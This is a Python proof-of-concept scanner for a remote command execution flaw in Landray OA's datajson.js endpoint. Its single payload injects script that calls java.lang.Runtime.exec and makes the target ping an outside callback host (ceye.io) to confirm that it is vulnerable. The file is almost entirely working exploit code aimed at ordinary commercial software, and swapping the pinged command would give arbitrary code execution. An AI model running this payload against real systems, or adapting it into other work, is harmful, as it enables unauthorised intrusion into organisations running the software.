import time
import requests
import urllib3
from rich.console import Console



console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        }
    console.print(now_time() + " [INFO]     正在检测蓝凌OA datajson 命令执行漏洞", style='bold blue')
    exp_url = target_url+'data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 10iknb.ceye.io")'
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(exp_url, headers=headers,verify=False)
        if "模拟通过" in respones.text:
            console.print(now_time() + ' [SUCCESS]  蓝凌OA OA datajson 命令执行漏洞存在', style='bold green')
            console.print(now_time() + ' [SUCCESS]  payload:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  蓝凌OA datajson 命令执行漏洞可能不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
   

            